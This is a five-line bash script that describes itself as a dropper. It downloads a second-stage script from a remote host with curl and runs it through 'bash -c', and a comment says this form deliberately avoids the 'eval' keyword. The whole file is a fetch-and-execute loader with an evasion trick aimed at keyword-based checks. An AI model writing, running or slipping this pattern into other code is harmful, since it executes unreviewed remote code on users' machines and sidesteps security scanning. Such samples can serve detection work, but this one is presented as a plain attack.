#!/bin/bash
# Dropper: fetches a second-stage payload and executes it via `bash -c`.
# Semantically equivalent to eval but avoids the `eval` keyword.
PAYLOAD=$(curl -s https://example.com/stage2.sh)
bash -c "$PAYLOAD"
